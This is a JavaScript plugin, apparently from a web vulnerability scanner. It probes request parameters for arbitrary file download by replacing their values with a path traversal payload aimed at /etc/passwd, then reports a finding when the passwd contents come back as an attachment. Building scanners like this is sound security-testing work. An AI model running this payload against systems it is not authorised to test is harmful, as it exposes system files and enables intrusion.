'use strict'
const RequestParser=require("../core/RequestParser.js")
const ResponseParser=require("../core/ResponseParser.js")

const  axios  = require("axios")

const {store_cookie} = require("../core/WebSpider.js")
// var response = await axios({   
//     url:req.url,
//     method:req.request.request_line.method,
//     data:req.data,
//     timeout:0,
//     headers:{
//       "Cookie":store_cookie[0]
//     },
// })
async function Check(req=new RequestParser("http://127.0.0.1")){
   // console.log(req.url)
    var playload="/../../../../../../../../../../../../../../../etc/passwd"
    var result=[]
    var url=new URL(req.url)
    var param1=new URLSearchParams(url.searchParams)
    var tag=false
    for (let [key, value] of param1) {
        if (value.includes(".")) {
          param1.set(key, playload);
          tag=true
        }
      }
    var param2=new URLSearchParams(req.request.data)
    for (let [key, value] of param2) {
        if (value.includes(".")) {
          param2.set(key, playload);
          tag=true
        }
      }
    if(tag===false)
        return [false]
    // console.log(req)
    try{
       //任意文件下载
       {
        let response=  await axios({
            url:url.origin+url.pathname+"?"+param1.toString(),
            method:req.request.request_line.method,
            data:param2.toString(),
            timeout:0,
            headers:{
                "Cookie":store_cookie[0]
            },
        })
    //    if(req.url.includes("filename=kb.png")){
    //     console.log(response.headers)
    //     console.log(url.origin+url.pathname+"?"+param1.toString())
    //    }
        // console.log(response.headers)
       
        if(response.headers["content-disposition"]!==undefined&&response.headers["content-disposition"].includes("attachment")&&response.data.includes("root:x:")){
            result.push([`下载的文件参数以 ${playload} 代替，会读取本地文件并下载`,""])
        }
       
       }
     
    }catch(e){
       // console.log(e)
    }


    if(result.length!==0)
        return [true].concat(result)
    else
        return [false]
    // 对于数组中的元素，第一个是触发方法，第二个是修复意见，如果没有的话就用默认的代替,可以接多个数组

}

module.exports=Check






